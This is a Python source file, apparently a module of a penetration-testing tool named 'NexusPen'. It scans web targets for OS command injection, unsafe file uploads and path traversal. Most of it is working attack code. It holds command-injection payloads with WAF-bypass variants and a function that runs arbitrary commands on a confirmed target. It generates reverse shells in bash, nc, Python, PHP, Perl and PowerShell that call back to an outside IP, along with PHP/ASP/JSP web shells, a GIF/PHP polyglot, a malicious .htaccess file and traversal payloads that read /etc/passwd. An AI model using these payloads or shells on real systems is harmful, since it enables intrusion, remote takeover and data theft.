#!/usr/bin/env python3
"""
NexusPen - Command Injection Module
====================================
OS command injection detection and exploitation.
"""

import requests
from typing import Dict, List, Optional
from dataclasses import dataclass
import time
from urllib.parse import quote

from rich.console import Console

console = Console()


@dataclass
class CommandInjectionResult:
    """Command injection result."""
    url: str
    parameter: str
    payload: str
    vulnerable: bool
    output: Optional[str] = None
    technique: str = 'unknown'


class CommandInjectionScanner:
    """
    OS command injection scanner.
    """
    
    # Command injection payloads
    PAYLOADS = {
        'unix_basic': [
            '; id',
            '| id',
            '& id',
            '`id`',
            '$(id)',
            '\n id',
            '; ls -la',
            '| cat /etc/passwd',
        ],
        'windows_basic': [
            '& whoami',
            '| whoami',
            '&& whoami',
            '|| whoami',
            '\n whoami',
            '& dir',
            '| type C:\\Windows\\win.ini',
        ],
        'time_based': [
            '; sleep 5',
            '| sleep 5',
            '& sleep 5 &',
            '`sleep 5`',
            '$(sleep 5)',
            '; ping -c 5 127.0.0.1',
            '& timeout 5',
            '| ping -n 5 127.0.0.1',
        ],
        'bypass': [
            ';{id}',
            "';id;'",
            '";id;"',
            '\n{id}',
            '|i""d',
            ';i\nd',
            ';$({id})',
            "';${IFS}id;'",
            ";${IFS}id",
            ';id${IFS}',
        ],
        'encoded': [
            '%3B%20id',  # ; id
            '%7C%20id',  # | id
            '%26%20id',  # & id
            '%0A%20id',  # \n id
        ],
    }
    
    # Files to read for PoC
    POC_FILES = {
        'unix': '/etc/passwd',
        'windows': 'C:\\Windows\\win.ini',
    }
    
    def __init__(self, target_url: str, session: requests.Session = None):
        self.target_url = target_url
        self.session = session or requests.Session()
        self.results: List[CommandInjectionResult] = []
    
    def test_basic_injection(self, param: str, method: str = 'GET') -> List[CommandInjectionResult]:
        """Test for basic command injection."""
        console.print(f"\n[cyan]💉 Testing command injection on: {param}[/cyan]")
        
        results = []
        
        all_payloads = self.PAYLOADS['unix_basic'] + self.PAYLOADS['windows_basic']
        
        for payload in all_payloads:
            try:
                if method.upper() == 'GET':
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        timeout=10
                    )
                else:
                    response = self.session.post(
                        self.target_url,
                        data={param: payload},
                        timeout=10
                    )
                
                # Check for command output
                indicators = ['uid=', 'gid=', 'root:', 'bin/', 'www-data',
                             'Administrator', 'SYSTEM', '[fonts]', 'extensions']
                
                for indicator in indicators:
                    if indicator in response.text:
                        result = CommandInjectionResult(
                            url=self.target_url,
                            parameter=param,
                            payload=payload,
                            vulnerable=True,
                            output=response.text[:500],
                            technique='basic'
                        )
                        results.append(result)
                        self.results.append(result)
                        console.print(f"[red]  ⚠️ Command injection confirmed![/red]")
                        console.print(f"[dim]     Payload: {payload}[/dim]")
                        return results  # Stop on first confirmed
                        
            except:
                pass
        
        return results
    
    def test_time_based(self, param: str, delay: int = 5) -> List[CommandInjectionResult]:
        """Test for time-based blind command injection."""
        console.print(f"\n[cyan]⏱️ Testing time-based injection on: {param}[/cyan]")
        
        results = []
        
        for payload in self.PAYLOADS['time_based']:
            try:
                start_time = time.time()
                
                response = self.session.get(
                    self.target_url,
                    params={param: payload},
                    timeout=delay + 10
                )
                
                elapsed = time.time() - start_time
                
                if elapsed >= delay:
                    result = CommandInjectionResult(
                        url=self.target_url,
                        parameter=param,
                        payload=payload,
                        vulnerable=True,
                        output=f"Response delayed by {elapsed:.2f}s",
                        technique='time_based'
                    )
                    results.append(result)
                    self.results.append(result)
                    console.print(f"[red]  ⚠️ Blind command injection confirmed![/red]")
                    console.print(f"[dim]     Delay: {elapsed:.2f}s with {payload}[/dim]")
                    return results
                    
            except requests.exceptions.Timeout:
                result = CommandInjectionResult(
                    url=self.target_url,
                    parameter=param,
                    payload=payload,
                    vulnerable=True,
                    output="Request timed out (command hung)",
                    technique='time_based'
                )
                results.append(result)
                self.results.append(result)
                console.print(f"[red]  ⚠️ Timeout indicates injection![/red]")
                return results
            except:
                pass
        
        return results
    
    def test_bypass_techniques(self, param: str) -> List[CommandInjectionResult]:
        """Test bypass techniques for WAF evasion."""
        console.print(f"\n[cyan]🔓 Testing bypass techniques...[/cyan]")
        
        results = []
        
        all_bypasses = self.PAYLOADS['bypass'] + self.PAYLOADS['encoded']
        
        for payload in all_bypasses:
            try:
                response = self.session.get(
                    self.target_url,
                    params={param: payload},
                    timeout=10
                )
                
                if 'uid=' in response.text or 'root:' in response.text:
                    result = CommandInjectionResult(
                        url=self.target_url,
                        parameter=param,
                        payload=payload,
                        vulnerable=True,
                        output=response.text[:500],
                        technique='bypass'
                    )
                    results.append(result)
                    self.results.append(result)
                    console.print(f"[red]  ⚠️ Bypass successful with: {payload}[/red]")
                    return results
                    
            except:
                pass
        
        return results
    
    def execute_command(self, param: str, command: str,
                       working_payload: str) -> Optional[str]:
        """Execute arbitrary command using confirmed injection point."""
        console.print(f"\n[cyan]⚡ Executing command: {command}[/cyan]")
        
        # Replace the original command in payload
        payload = working_payload.replace('id', command)
        payload = payload.replace('whoami', command)
        
        try:
            response = self.session.get(
                self.target_url,
                params={param: payload},
                timeout=30
            )
            
            return response.text
            
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
            return None
    
    @staticmethod
    def generate_reverse_shell(ip: str, port: int, shell_type: str = 'bash') -> str:
        """Generate reverse shell payload."""
        shells = {
            'bash': f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'nc': f'nc {ip} {port} -e /bin/sh',
            'php': f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
            'powershell': f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        }
        
        return shells.get(shell_type, shells['bash'])


class UploadVulnScanner:
    """
    File upload vulnerability scanner.
    """
    
    # Shell payloads for different extensions
    SHELL_PAYLOADS = {
        'php': '<?php system($_GET["cmd"]); ?>',
        'php_short': '<?=`$_GET[0]`?>',
        'php_eval': '<?php eval($_POST["cmd"]); ?>',
        'asp': '<%eval request("cmd")%>',
        'aspx': '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request["cmd"]); %>',
        'jsp': '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
    }
    
    # Extension bypass techniques
    EXTENSION_BYPASSES = [
        # Double extensions
        '.php.jpg', '.php.png', '.php.gif',
        # Null byte (older PHP)
        '.php%00.jpg', '.php\x00.jpg',
        # Alternative PHP extensions
        '.phtml', '.phar', '.inc', '.php3', '.php4', '.php5', '.php7',
        # Case variations
        '.PHP', '.Php', '.pHp', '.phP',
        # Special handling
        '.htaccess', '.user.ini',
        # Other
        '.shtml', '.shtm',
    ]
    
    def __init__(self, target_url: str, session: requests.Session = None):
        self.target_url = target_url
        self.session = session or requests.Session()
    
    def test_upload(self, upload_field: str = 'file',
                   allowed_types: List[str] = None) -> Dict:
        """Test file upload for vulnerabilities."""
        console.print(f"\n[cyan]📤 Testing file upload...[/cyan]")
        
        results = {
            'vulnerable': False,
            'bypasses': [],
            'shell_uploaded': False,
        }
        
        # Test different bypass techniques
        for bypass in self.EXTENSION_BYPASSES:
            for shell_type, payload in self.SHELL_PAYLOADS.items():
                filename = f'shell{bypass}'
                
                files = {
                    upload_field: (filename, payload.encode(), 'image/jpeg')
                }
                
                try:
                    response = self.session.post(
                        self.target_url,
                        files=files,
                        timeout=10
                    )
                    
                    if response.status_code in [200, 201]:
                        # Check if file was uploaded
                        if 'error' not in response.text.lower() and 'invalid' not in response.text.lower():
                            results['bypasses'].append({
                                'extension': bypass,
                                'shell_type': shell_type,
                                'response': response.text[:200]
                            })
                            console.print(f"[yellow]  ⚠️ Upload accepted: {filename}[/yellow]")
                            
                except:
                    pass
        
        if results['bypasses']:
            results['vulnerable'] = True
            console.print(f"[red]  ⚠️ {len(results['bypasses'])} bypass methods found![/red]")
        
        return results
    
    def generate_polyglot(self, shell_type: str = 'php') -> bytes:
        """Generate polyglot file (valid image + shell)."""
        # GIF header + PHP code
        gif_header = b'GIF89a'
        php_shell = self.SHELL_PAYLOADS[shell_type].encode()
        
        return gif_header + b'\n' + php_shell
    
    @staticmethod
    def htaccess_payload() -> str:
        """Generate malicious .htaccess."""
        return '''
# Allow PHP execution in this directory
AddType application/x-httpd-php .jpg .png .gif

# Or alternative
<FilesMatch "shell">
    SetHandler application/x-httpd-php
</FilesMatch>
'''


class PathTraversalScanner:
    """
    Enhanced path traversal scanner.
    """
    
    PAYLOADS = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '../../../windows/win.ini',
        '..\\..\\..\\windows\\win.ini',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc/passwd',
        '....//....//....//etc/passwd%00',
        '/etc/passwd',
        'file:///etc/passwd',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/read=convert.base64-encode/resource=../config.php',
    ]
    
    def __init__(self, target_url: str, session: requests.Session = None):
        self.target_url = target_url
        self.session = session or requests.Session()
    
    def test_traversal(self, param: str) -> List[Dict]:
        """Test for path traversal."""
        console.print(f"\n[cyan]📂 Testing path traversal on: {param}[/cyan]")
        
        findings = []
        
        for payload in self.PAYLOADS:
            try:
                response = self.session.get(
                    self.target_url,
                    params={param: payload},
                    timeout=10
                )
                
                # Check for file content
                if 'root:' in response.text or '[fonts]' in response.text:
                    findings.append({
                        'payload': payload,
                        'content': response.text[:500]
                    })
                    console.print(f"[red]  ⚠️ Path traversal confirmed![/red]")
                    break
                    
            except:
                pass
        
        return findings
